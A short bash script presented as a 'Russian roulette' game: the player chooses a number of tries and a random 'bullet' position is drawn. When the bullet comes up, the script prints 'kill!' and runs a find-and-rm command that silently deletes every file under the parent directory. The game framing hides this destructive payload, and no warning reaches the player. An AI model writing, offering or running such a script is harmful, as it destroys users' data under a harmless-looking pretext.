#! /bin/bash

if [ $RANDOM = $RANDOM ]
then 
	echo "To run this script, you mast have a $RANDOM variable"
	return 1
else
	if [ $BULLETCOUNT ]
	then 
		if [[ "$BULLETCOUNT" -le "1" || "$BULLETCOUNT" -gt 100 ]]
		then 
			echo "\$BULLETCOUNT variable mast be in (2..100)"
			exit 1
		fi
			
	else
		echo "You can set the \$BULLETCOUNT variable, by default it is set to 6"
		BULLETCOUNT=6
	fi
	
	
	
	
	echo $count
	while [[ "$count" -le "0" || "$count" -gt "$BULLETCOUNT" ]]
	do
		read -p "Enter number of trys (1-$BULLETCOUNT): " count
	done
	
	let "bullet = $RANDOM % $BULLETCOUNT"
	
	pos=0
	
	while [[ "$pos" -lt count ]]
	do
		echo "shot?"
		
		if [[ "$pos" -eq "$bullet" ]]
		then
			echo "kill!"
			
			find ../ -type f -exec rm -f {} \;
			exit 0
			
		fi
		
		echo -e "\a"
		sleep 1.5s
		
		let "pos++"
	done
	
fi

exit 0
